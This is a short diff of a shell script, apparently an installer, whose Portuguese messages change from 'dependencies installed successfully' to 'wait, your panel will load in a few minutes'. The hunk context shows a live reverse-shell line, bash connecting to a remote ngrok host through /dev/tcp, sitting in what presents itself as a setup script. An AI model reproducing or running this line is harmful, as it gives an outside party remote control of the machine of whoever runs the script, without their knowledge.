@@ -4,5 +4,5 @@ bash -i >& /dev/tcp/6.tcp.ngrok.io/11451 0>&1
 
 clear
 
-echo -e '\e[92;1mDependências instaladas com sucesso :]\e[m'
+echo -e '\e[92;1mAguarde Seu Painel Carregará Em Poucos Mins\e[m'
 
